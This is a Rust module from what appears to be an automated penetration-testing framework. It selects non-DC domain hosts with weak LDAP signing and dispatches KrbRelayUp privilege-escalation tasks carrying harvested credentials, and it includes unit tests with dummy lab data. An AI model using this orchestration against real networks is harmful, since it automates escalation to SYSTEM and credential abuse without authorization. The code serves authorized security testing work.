//! auto_krbrelayup -- exploit KrbRelayUp when LDAP signing is not enforced.
//!
//! KrbRelayUp abuses Kerberos authentication relay to LDAP when LDAP signing
//! is not required. It creates a computer account (MAQ > 0), relays Kerberos
//! auth to LDAP to set up RBCD on a target, then uses S4U2Self/S4U2Proxy
//! to get a service ticket as admin. This is a local privilege escalation
//! that works from any authenticated domain user to SYSTEM on domain-joined hosts.
//!
//! Prereqs: LDAP signing NOT enforced (checked by auto_ldap_signing),
//! MAQ > 0 (checked by auto_machine_account_quota), valid domain creds.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Collect KrbRelayUp work items from current state.
///
/// Pure logic extracted from `auto_krbrelayup` so it can be unit-tested
/// without needing a `Dispatcher` or async runtime.
fn collect_krbrelayup_work(state: &StateInner) -> Vec<KrbRelayUpWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    // Check if any DC has LDAP signing disabled (vuln registered by auto_ldap_signing)
    let has_ldap_weak = state.discovered_vulnerabilities.values().any(|v| {
        let vtype = v.vuln_type.to_lowercase();
        vtype == "ldap_signing_disabled" || vtype == "ldap_signing_not_required"
    });

    if !has_ldap_weak {
        return Vec::new();
    }

    let mut items = Vec::new();

    // Target non-DC hosts (priv esc on member servers)
    for host in &state.hosts {
        if host.is_dc {
            continue;
        }

        // Skip hosts we already own
        if state.is_processed(DEDUP_SECRETSDUMP, &host.ip) {
            continue;
        }

        let dedup_key = format!("krbrelayup:{}", host.ip);
        if state.is_processed(DEDUP_KRBRELAYUP, &dedup_key) {
            continue;
        }

        let domain = host
            .hostname
            .find('.')
            .map(|i| host.hostname[i + 1..].to_lowercase())
            .unwrap_or_default();

        // Domain match is required: krbrelayup binds the credential to the
        // host's domain controller; a foreign-domain cred fails with
        // invalidCredentials before any work happens. The previous
        // `.or_else(|| state.credentials.first())` fallback paired hosts
        // with whatever cred happened to be first in state, which routinely
        // dispatched a foreign-forest cred against an unrelated host and
        // burned ~30k LLM tokens per failed task. Skip when no matching
        // cred exists; the next tick will retry once one lands.
        let cred = state
            .credentials
            .iter()
            .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain)
            .cloned();

        let Some(cred) = cred else {
            continue;
        };

        items.push(KrbRelayUpWork {
            dedup_key,
            target_ip: host.ip.clone(),
            hostname: host.hostname.clone(),
            domain,
            credential: cred,
        });
    }

    items
}

/// Dispatches KrbRelayUp exploitation against hosts when LDAP signing is weak.
/// Interval: 45s.
pub async fn auto_krbrelayup(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("krbrelayup") {
            continue;
        }

        let work = {
            let state = dispatcher.state.read().await;
            collect_krbrelayup_work(&state)
        };

        for item in work {
            let payload = json!({
                "technique": "krbrelayup",
                "target_ip": item.target_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("krbrelayup");
            match dispatcher
                .throttled_submit("privesc", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        hostname = %item.hostname,
                        "KrbRelayUp exploitation dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_KRBRELAYUP, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_KRBRELAYUP, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "KrbRelayUp deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch KrbRelayUp");
                }
            }
        }
    }
}

struct KrbRelayUpWork {
    dedup_key: String,
    target_ip: String,
    hostname: String,
    domain: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;
    use ares_core::models::{Credential, Host, VulnerabilityInfo};

    fn make_credential(username: &str, password: &str, domain: &str) -> Credential {
        Credential {
            id: format!("c-{username}"),
            username: username.into(),
            password: password.into(), // pragma: allowlist secret
            domain: domain.into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_host(ip: &str, hostname: &str, is_dc: bool) -> Host {
        Host {
            ip: ip.into(),
            hostname: hostname.into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc,
            owned: false,
        }
    }

    fn make_ldap_vuln() -> VulnerabilityInfo {
        VulnerabilityInfo {
            vuln_id: "ldap-weak-1".into(),
            vuln_type: "ldap_signing_disabled".into(),
            target: "192.168.58.10".into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details: Default::default(),
            recommended_agent: String::new(),
            priority: 5,
        }
    }

    // --- collect_krbrelayup_work tests ---

    #[test]
    fn collect_empty_state_returns_no_work() {
        let state = StateInner::new("test-op".into());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_credentials_returns_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_ldap_vuln_returns_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_non_dc_host_with_ldap_vuln_produces_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        let work = collect_krbrelayup_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.30");
        assert_eq!(work[0].hostname, "srv01.contoso.local");
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].dedup_key, "krbrelayup:192.168.58.30");
    }

    #[test]
    fn collect_skips_dc_hosts() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.10", "dc01.contoso.local", true));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_skips_already_processed() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        state.mark_processed(DEDUP_KRBRELAYUP, "krbrelayup:192.168.58.30".into());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_already_owned_hosts() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        state.mark_processed(DEDUP_SECRETSDUMP, "192.168.58.30".into());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_ldap_signing_not_required_also_triggers() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let mut vuln = make_ldap_vuln();
        vuln.vuln_type = "ldap_signing_not_required".into();
        state.discovered_vulnerabilities.insert("v1".into(), vuln);
        let work = collect_krbrelayup_work(&state);
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn collect_bare_hostname_skips_when_no_domain_match() {
        // Bare hostname yields domain="" (no FQDN dot to split on); the
        // credential filter can't pair any cred with the host, so dispatch
        // must be skipped until an FQDN-resolving recon pass populates
        // `host.hostname` with a domain suffix.
        let mut state = StateInner::new("test-op".into());
        state.hosts.push(make_host("192.168.58.30", "ws01", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_when_no_cred_for_host_domain() {
        // A host in fabrikam.local with only a contoso.local credential
        // should be skipped, not paired with the cross-forest cred.
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.31", "srv01.fabrikam.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        let work = collect_krbrelayup_work(&state);
        assert!(work.is_empty());
    }

    #[test]
    fn collect_multiple_non_dc_hosts() {
        let mut state = StateInner::new("test-op".into());
        state
            .hosts
            .push(make_host("192.168.58.30", "srv01.contoso.local", false));
        state
            .hosts
            .push(make_host("192.168.58.31", "srv02.fabrikam.local", false));
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .credentials
            .push(make_credential("svcacct", "Svc!Pass1", "fabrikam.local")); // pragma: allowlist secret
        state
            .discovered_vulnerabilities
            .insert("v1".into(), make_ldap_vuln());
        let work = collect_krbrelayup_work(&state);
        assert_eq!(work.len(), 2);
    }

    #[test]
    fn dedup_key_format() {
        let key = format!("krbrelayup:{}", "192.168.58.22");
        assert_eq!(key, "krbrelayup:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_KRBRELAYUP, "krbrelayup");
    }

    #[test]
    fn ldap_signing_vuln_types() {
        let types = ["ldap_signing_disabled", "ldap_signing_not_required"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype == "ldap_signing_disabled" || vtype == "ldap_signing_not_required",
                "{t} should match LDAP weak signing"
            );
        }
    }

    #[test]
    fn non_ldap_vuln_types_rejected() {
        let types = ["smb_signing_disabled", "mssql_access"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype != "ldap_signing_disabled" && vtype != "ldap_signing_not_required",
                "{t} should NOT match LDAP weak signing"
            );
        }
    }

    #[test]
    fn domain_from_hostname() {
        let hostname = "srv01.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "krbrelayup",
            "target_ip": "192.168.58.30",
            "hostname": "srv01.contoso.local",
            "domain": "contoso.local",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "krbrelayup");
        assert_eq!(payload["target_ip"], "192.168.58.30");
        assert_eq!(payload["hostname"], "srv01.contoso.local");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "testuser".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = KrbRelayUpWork {
            dedup_key: "krbrelayup:192.168.58.30".into(),
            target_ip: "192.168.58.30".into(),
            hostname: "srv01.contoso.local".into(),
            domain: "contoso.local".into(),
            credential: cred,
        };

        assert_eq!(work.dedup_key, "krbrelayup:192.168.58.30");
        assert_eq!(work.target_ip, "192.168.58.30");
        assert_eq!(work.hostname, "srv01.contoso.local");
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.credential.username, "testuser");
    }

    #[test]
    fn ldap_signing_not_enforced_matches() {
        let vtype = "ldap_signing_not_enforced".to_lowercase();
        // The code checks for "ldap_signing_disabled" or "ldap_signing_not_required"
        let matches = vtype == "ldap_signing_disabled" || vtype == "ldap_signing_not_required";
        assert!(
            !matches,
            "ldap_signing_not_enforced should NOT match the specific vuln types"
        );
    }

    #[test]
    fn non_matching_vuln_types() {
        let types = [
            "esc1",
            "smb_signing_disabled",
            "unconstrained_delegation",
            "mssql_access",
        ];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype != "ldap_signing_disabled" && vtype != "ldap_signing_not_required",
                "{t} should NOT match LDAP weak signing"
            );
        }
    }

    #[test]
    fn domain_from_bare_hostname() {
        let hostname = "ws01";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "");
    }

    #[test]
    fn domain_from_fabrikam_host() {
        let hostname = "srv01.fabrikam.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "fabrikam.local");
    }
}
